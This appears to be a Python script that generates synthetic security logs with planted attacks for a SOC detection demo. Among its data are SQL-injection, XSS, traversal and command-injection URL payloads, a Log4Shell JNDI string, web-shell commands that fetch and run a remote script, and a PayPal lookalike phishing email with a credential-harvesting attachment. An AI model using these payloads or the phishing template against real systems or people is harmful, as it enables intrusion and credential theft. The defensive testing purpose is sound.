"""Generate realistic sample logs with planted attacks (deterministic, seed=7).

    python samples/generate.py            # writes into samples/
    python samples/generate.py OUT_DIR

Planted scenarios (what `soc demo` should find):
  dns.csv     10.0.1.15 DNS tunneling to exfil-cdn.net (TXT, base32 chunks)
              10.0.1.23 DGA burst (NXDOMAIN) + one resolved C2 domain
              10.0.1.42 using 8.8.8.8 / 1.1.1.1 directly
              secure-login-update.com fast-flux (many IPs, TTL 60)
  access.log  203.0.113.50 Nikto + 404 burst, then 200 on /.env
              198.51.100.7 sqlmap UNION SELECT / traversal / Log4Shell
              45.33.12.9  POSTs to /uploads/images/logo.php (web shell)
              192.0.2.77  /login brute force -> success
  auth.csv    jsmith brute forced from 185.220.101.5 -> success
              91.240.118.2 spraying 25 accounts -> mlee compromised
              akhan impossible travel US -> RU in 40 minutes
  conn.csv    10.0.1.15 beacons to 45.33.32.156:443 every ~60s
  phish.eml   PayPal lookalike credential phish; benign.eml for contrast
"""

from __future__ import annotations

import base64
import csv
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

R = random.Random(7)
START = datetime(2026, 11, 20, 8, 0, 0, tzinfo=timezone.utc)

BENIGN_DOMAINS = [
    "www.google.com", "outlook.office365.com", "login.microsoftonline.com", "teams.microsoft.com",
    "www.github.com", "api.github.com", "slack.com", "edge.slack.com", "www.linkedin.com",
    "update.googleapis.com", "fonts.gstatic.com", "www.wikipedia.org", "zoom.us", "us02web.zoom.us",
    "cdn.jsdelivr.net", "www.amazon.com", "s3.amazonaws.com", "ocsp.digicert.com", "www.bbc.co.uk",
    "settings-win.data.microsoft.com", "ctldl.windowsupdate.com", "www.salesforce.com",
    "app.atlassian.net", "dropbox.com", "accounts.google.com", "clients4.google.com",
    "time.windows.com", "www.youtube.com", "i.ytimg.com", "www.reddit.com", "news.ycombinator.com",
]
HOSTS = [f"10.0.1.{i}" for i in range(10, 60)]
USERS = ["jsmith", "mlee", "akhan", "rpatel", "cnguyen", "dbrown", "ewilson", "fgarcia", "hlopez",
         "imartin", "jclark", "klewis", "lwalker", "mhall", "nallen", "oyoung", "phernandez", "qking",
         "rwright", "sscott", "tgreen", "uadams", "vbaker", "wnelson", "xcarter", "ymitchell", "zperez",
         "admin", "svc_backup", "helpdesk"]
BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
]


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def clf(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def rand_ip() -> str:
    return f"{R.choice([23, 34, 52, 66, 81, 104, 142, 172, 185, 193, 212])}.{R.randint(1, 254)}." \
           f"{R.randint(1, 254)}.{R.randint(1, 254)}"


def gen_dns(out: Path) -> None:
    rows = []
    pool = {d: [rand_ip() for _ in range(R.randint(1, 4))] for d in BENIGN_DOMAINS}
    for _ in range(2500):
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        q = R.choice(BENIGN_DOMAINS)
        qtype = R.choice(["A", "A", "A", "AAAA", "HTTPS"])
        ans = ";".join(R.sample(pool[q], k=min(len(pool[q]), R.randint(1, 2))))
        rows.append([iso(t), R.choice(HOSTS), q, qtype, "NOERROR", "10.0.0.53", ans, R.choice([60, 300, 3600])])
    for _ in range(40):  # ordinary typos
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        rows.append([iso(t), R.choice(HOSTS), R.choice(["gooogle.com", "outlok.com", "intranet.corp",
                                                        "wpad.corp.local"]), "A", "NXDOMAIN", "10.0.0.53", "", ""])
    # tunneling: base32 chunks of a "stolen" file, TXT queries
    secret = ("CONFIDENTIAL customer export id,name,email,card_last4\n" * 120).encode()
    chunks = base64.b32encode(secret).decode().rstrip("=").lower()
    t = START + timedelta(hours=2)
    for i in range(0, min(len(chunks), 60 * 180), 60):
        part = chunks[i:i + 60]
        q = f"{part[:30]}.{part[30:]}.{i // 60:04x}.exfil-cdn.net"
        t += timedelta(seconds=R.uniform(0.5, 3))
        rows.append([iso(t), "10.0.1.15", q, "TXT", "NOERROR", "10.0.0.53", "", 0])
    # DGA burst
    t = START + timedelta(hours=3)
    alphabet = "bcdfghjklmnpqrstvwxz0123456789"
    for i in range(70):
        name = "".join(R.choice(alphabet) for _ in range(R.randint(9, 14))) + R.choice([".xyz", ".top", ".info", ".biz"])
        t += timedelta(seconds=R.uniform(0.2, 1.5))
        rows.append([iso(t), "10.0.1.23", name, "A", "NXDOMAIN", "10.0.0.53", "", ""])
    rows.append([iso(t + timedelta(seconds=1)), "10.0.1.23", "qx7kzv9pwr2m.top", "A", "NOERROR", "10.0.0.53",
                 "185.215.113.66", 120])
    # external resolver
    for _ in range(25):
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        rows.append([iso(t), "10.0.1.42", R.choice(BENIGN_DOMAINS[:10]), "A", "NOERROR",
                     R.choice(["8.8.8.8", "1.1.1.1"]), "142.250.72.14", 300])
    # fast flux
    for _ in range(30):
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        ans = ";".join(f"{R.randint(30, 220)}.{R.randint(0, 255)}.{R.randint(0, 255)}.{R.randint(1, 254)}"
                       for _ in range(3))
        rows.append([iso(t), R.choice(HOSTS), "secure-login-update.com", "A", "NOERROR", "10.0.0.53", ans, 60])
    rows.sort(key=lambda r: r[0])
    with open(out / "dns.csv", "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["timestamp", "src_ip", "query", "qtype", "rcode", "resolver", "answers", "ttl"])
        w.writerows(rows)


def gen_web(out: Path) -> None:
    lines: list[tuple[datetime, str]] = []
    pages = ["/", "/index.html", "/about", "/products", "/products/42", "/blog/soc-tips", "/contact",
             "/static/css/site.css", "/static/js/app.js", "/images/logo.png", "/favicon.ico", "/api/v1/items"]

    def add(t, ip, method, path, status, size, ua, ref="-"):
        lines.append((t, f'{ip} - - [{clf(t)}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"'))

    visitors = [rand_ip() for _ in range(60)]
    for _ in range(3000):
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        p = R.choice(pages)
        status = R.choices([200, 304, 404], [90, 8, 2])[0]
        add(t, R.choice(visitors), "GET", p, status, R.randint(300, 40000), R.choice(BROWSER_UAS))
    for _ in range(60):  # real users logging in, occasionally mistyping
        t = START + timedelta(seconds=R.randint(0, 8 * 3600))
        ip = R.choice(visitors)
        if R.random() < 0.2:
            add(t, ip, "POST", "/login", 401, 512, R.choice(BROWSER_UAS))
        add(t + timedelta(seconds=8), ip, "POST", "/login", 302, 0, R.choice(BROWSER_UAS))

    # Nikto scan
    nikto = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
    t = START + timedelta(hours=1, minutes=10)
    words = ["admin", "backup", "old", "test", "phpmyadmin", "wp-admin", "cgi-bin/test.cgi", "server-info",
             "config", ".git/HEAD", "db", "sql", "manager/html", "jmx-console", "console", "install", "setup.php",
             "readme.txt", "CHANGELOG", "api/swagger", "debug", "trace.axd", "elmah.axd", "upload", "tmp"]
    for i in range(240):
        t += timedelta(seconds=R.uniform(0.1, 0.6))
        add(t, "203.0.113.50", "GET", f"/{R.choice(words)}{R.choice(['', '/', '.bak', '.zip', '.old', str(i)])}",
            404, 210, nikto)
    add(t + timedelta(seconds=2), "203.0.113.50", "GET", "/.env", 200, 1432, nikto)
    add(t + timedelta(seconds=3), "203.0.113.50", "GET", "/.git/config", 200, 312, nikto)

    # sqlmap + other injection
    t = START + timedelta(hours=2, minutes=30)
    sqlmap = "sqlmap/1.8.11#stable (https://sqlmap.org)"
    payloads = [
        "/products?id=42%27%20OR%20%271%27%3D%271",
        "/products?id=42%20UNION%20ALL%20SELECT%20NULL%2Cusername%2Cpassword%20FROM%20users--",
        "/products?id=42%20AND%20SLEEP(5)",
        "/products?id=42%20AND%20extractvalue(1%2Cconcat(0x7e%2Cversion()))",
        "/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E",
        "/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
    ]
    for i in range(45):
        t += timedelta(seconds=R.uniform(0.3, 2))
        add(t, "198.51.100.7", "GET", R.choice(payloads), R.choice([200, 500, 403]), R.randint(200, 5000), sqlmap)
    add(t + timedelta(minutes=5), "198.51.100.7", "GET", "/", 200, 4200,
        "${jndi:ldap://198.51.100.7:1389/Exploit}")

    # web shell
    t = START + timedelta(hours=4)
    add(t, "45.33.12.9", "POST", "/upload.php", 200, 88, BROWSER_UAS[0])
    for cmd in ["whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /var/www", "wget http://45.33.12.9/x.sh",
                "chmod +x x.sh", "./x.sh", "ps aux", "netstat -tulpn", "cat config.php", "history"]:
        t += timedelta(seconds=R.uniform(5, 40))
        add(t, "45.33.12.9", "POST", "/uploads/images/logo.php", 200, R.randint(40, 3000), BROWSER_UAS[0])

    # login brute force
    t = START + timedelta(hours=5)
    hydra = "Mozilla/5.0 (Hydra)"
    for _ in range(60):
        t += timedelta(seconds=R.uniform(1, 4))
        add(t, "192.0.2.77", "POST", "/login", 401, 512, hydra)
    add(t + timedelta(seconds=2), "192.0.2.77", "POST", "/login", 302, 0, hydra)
    add(t + timedelta(seconds=3), "192.0.2.77", "GET", "/admin/dashboard", 200, 9100, hydra)

    # an internal monitor using curl (low severity noise)
    for i in range(20):
        add(START + timedelta(minutes=20 * i), "10.0.5.5", "GET", "/healthz", 200, 2, "curl/8.5.0")

    lines.sort(key=lambda x: x[0])
    (out / "access.log").write_text("\n".join(l for _, l in lines) + "\n")


def gen_auth(out: Path) -> None:
    rows = []
    home = {u: R.choice(["US", "US", "US", "GB", "IN"]) for u in USERS}
    home["akhan"] = "US"
    for _ in range(1500):
        u = R.choice(USERS)
        t = START + timedelta(seconds=R.randint(0, 10 * 3600))
        ip = f"10.0.{R.randint(1, 4)}.{R.randint(10, 200)}"
        ok = R.random() > 0.05
        rows.append([iso(t), u, ip, "success" if ok else "failure", home[u], R.choice(["vpn", "sso", "owa"])])
    # brute force jsmith
    t = START + timedelta(hours=1, minutes=5)
    for _ in range(35):
        t += timedelta(seconds=R.uniform(2, 10))
        rows.append([iso(t), "jsmith", "185.220.101.5", "failure", "DE", "owa"])
    rows.append([iso(t + timedelta(seconds=20)), "jsmith", "185.220.101.5", "success", "DE", "owa"])
    # password spray
    t = START + timedelta(hours=6)
    targets = R.sample([u for u in USERS if u != "mlee"], 24) + ["mlee"]
    for u in targets:
        t += timedelta(seconds=R.uniform(30, 90))
        rows.append([iso(t), u, "91.240.118.2", "failure", "NL", "sso"])
    rows.append([iso(t + timedelta(minutes=3)), "mlee", "91.240.118.2", "success", "NL", "sso"])
    # impossible travel
    t = START + timedelta(hours=7)
    rows.append([iso(t), "akhan", "73.162.10.4", "success", "US", "sso"])
    rows.append([iso(t + timedelta(minutes=40)), "akhan", "95.165.22.180", "success", "RU", "sso"])
    rows.sort(key=lambda r: r[0])
    with open(out / "auth.csv", "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["timestamp", "user", "src_ip", "result", "country", "service"])
        w.writerows(rows)


def gen_conn(out: Path) -> None:
    rows = []
    dests = [("140.82.112.3", 443), ("52.96.10.2", 443), ("142.250.72.14", 443), ("151.101.1.69", 443),
             ("13.107.42.14", 443), ("104.18.32.7", 443), ("10.0.0.53", 53), ("10.0.0.10", 445)]
    for _ in range(5000):
        t = START + timedelta(seconds=R.uniform(0, 8 * 3600))
        d, p = R.choice(dests)
        rows.append([iso(t), R.choice(HOSTS), d, p, R.randint(80, 90000)])
    t = START + timedelta(minutes=13)
    while t < START + timedelta(hours=8):
        if R.random() > 0.03:  # occasionally a beacon is missed
            rows.append([iso(t), "10.0.1.15", "45.33.32.156", 443, R.randint(480, 540)])
        t += timedelta(seconds=60 + R.uniform(-3, 3))
    rows.sort(key=lambda r: r[0])
    with open(out / "conn.csv", "w", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["timestamp", "src_ip", "dst", "dst_port", "bytes_out"])
        w.writerows(rows)


PHISH = """\
Return-Path: <bounce-7731@mailer.bulk-sender.ru>
Received: from mail.corp-example.com (mail.corp-example.com [10.0.0.25])
	by mx.corp-example.com with ESMTP id 7f3a; Fri, 20 Nov 2026 09:14:05 +0000
Received: from vps-2231.hostingco.net (vps-2231.hostingco.net [185.193.88.4])
	by mail.corp-example.com with ESMTP id 1c9d; Fri, 20 Nov 2026 09:14:03 +0000
Authentication-Results: mx.corp-example.com;
	spf=fail (sender IP is 185.193.88.4) smtp.mailfrom=bulk-sender.ru;
	dkim=none (message not signed);
	dmarc=fail action=none header.from=paypa1-secure.com
From: "PayPal Security" <service@paypa1-secure.com>
Reply-To: <support-case-88213@protonmail.com>
To: <jsmith@corp-example.com>
Subject: URGENT: Your account will be suspended - action required
Date: Fri, 20 Nov 2026 09:13:58 +0000
Message-ID: <a81f7e2c@paypa1-secure.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="BOUNDARY-OUTER"

--BOUNDARY-OUTER
Content-Type: multipart/alternative; boundary="BOUNDARY-ALT"

--BOUNDARY-ALT
Content-Type: text/plain; charset="utf-8"

Dear Customer,

We detected unusual activity on your account. Your account will be suspended
within 24 hours unless you verify your identity immediately.

Verify now: https://www.paypal.com/signin
Backup link: https://bit.ly/3pPlVrfy

PayPal Security Team

--BOUNDARY-ALT
Content-Type: text/html; charset="utf-8"

<html><body>
<p>Dear Customer,</p>
<p>We detected <b>unusual activity</b> on your account. Your account will be suspended
within 24 hours unless you verify your identity immediately.</p>
<p><a href="http://185.193.88.4/paypal/signin/verify.php?id=88213">https://www.paypal.com/signin</a></p>
<p>Backup link: <a href="https://bit.ly/3pPlVrfy">click here</a></p>
<p>Or reset at <a href="https://paypal-account-review.xyz/login">PayPal Account Review</a></p>
</body></html>

--BOUNDARY-ALT--

--BOUNDARY-OUTER
Content-Type: text/html; name="PayPal_Statement.pdf.html"
Content-Disposition: attachment; filename="PayPal_Statement.pdf.html"
Content-Transfer-Encoding: base64

PGh0bWw+PGJvZHk+PGZvcm0gYWN0aW9uPSJodHRwOi8vMTg1LjE5My44OC40L2dhdGUucGhwIj48aW5wdXQgbmFtZT0icGFzcyI+PC9mb3JtPjwvYm9keT48L2h0bWw+

--BOUNDARY-OUTER--
"""

BENIGN = """\
Return-Path: <notifications@github.com>
Received: from out-21.smtp.github.com (out-21.smtp.github.com [192.30.252.204])
	by mx.corp-example.com with ESMTPS id 99ab; Fri, 20 Nov 2026 10:02:11 +0000
Authentication-Results: mx.corp-example.com;
	spf=pass smtp.mailfrom=github.com;
	dkim=pass header.d=github.com;
	dmarc=pass header.from=github.com
From: "GitHub" <notifications@github.com>
To: <jsmith@corp-example.com>
Subject: [tool_soc] New comment on pull request
Date: Fri, 20 Nov 2026 10:02:09 +0000
Message-ID: <tool_soc/pull/3/c1@github.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

A new comment was posted on your pull request.

View it on GitHub: https://github.com/example/tool_soc/pull/3
"""


def main() -> None:
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent
    out.mkdir(parents=True, exist_ok=True)
    gen_dns(out)
    gen_web(out)
    gen_auth(out)
    gen_conn(out)
    (out / "phish.eml").write_text(PHISH)
    (out / "benign.eml").write_text(BENIGN)
    (out / "iocs.txt").write_text(
        "# IOCs from a threat report (defanged, as you'd receive them)\n"
        "45.33.32[.]156\nhxxp://185.193.88[.]4/paypal/signin/verify.php\npaypa1-secure[.]com\n"
        "qx7kzv9pwr2m[.]top\nexfil-cdn[.]net\n10.0.1.15\n"
        "44d88612fea8a8f36de82e1278abb02f\nCVE-2021-44228\n")
    print(f"Sample data written to {out}")


if __name__ == "__main__":
    main()
